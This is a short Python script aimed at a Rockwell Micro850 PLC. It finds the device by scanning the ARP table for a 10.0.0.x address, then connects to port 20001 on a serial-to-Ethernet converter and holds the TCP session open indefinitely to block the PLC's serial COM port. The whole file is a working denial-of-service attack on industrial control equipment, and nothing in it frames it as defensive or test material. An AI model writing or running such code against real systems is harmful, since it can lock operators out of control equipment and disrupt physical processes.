import socket
import subprocess
import time

# Function to find the IP address of the Rockwell Micro850 PLC
def find_plc_ip():
    # Assuming the PLC is connected to the same network and has a static IP or can be discovered via ARP
    # This is a simple ARP scan to find the IP address of the PLC
    try:
        # Run the ARP command to get the list of devices on the network
        arp_output = subprocess.check_output("arp -a", shell=True).decode('utf-8')
        lines = arp_output.split('\n')
        
        # Filter the output to find the IP address of the PLC
        for line in lines:
            if "10.0.0." in line:  # Adjust this to match the expected IP range of the PLC
                ip = line.split()[0]
                return ip
    except Exception as e:
        print(f"Error finding PLC IP: {e}")
        return None

# Function to block the serial COM port by holding open a TCP session
def block_serial_com(ip, port):
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the serial to Ethernet converter
        sock.connect((ip, port))
        
        print(f"Connected to {ip} on port {port}. Holding the connection open to block the serial COM port.")
        
        # Hold the connection open indefinitely
        while True:
            time.sleep(1)
    except Exception as e:
        print(f"Error blocking serial COM port: {e}")

# Main function
def main():
    # Find the IP address of the PLC
    plc_ip = find_plc_ip()
    if plc_ip is None:
        print("Could not find the PLC IP address.")
        return
    
    print(f"PLC IP address found: {plc_ip}")
    
    # Define the port to block (e.g., 20001 for COM1)
    port_to_block = 20001
    
    # Block the serial COM port
    block_serial_com(plc_ip, port_to_block)

if __name__ == "__main__":
    main()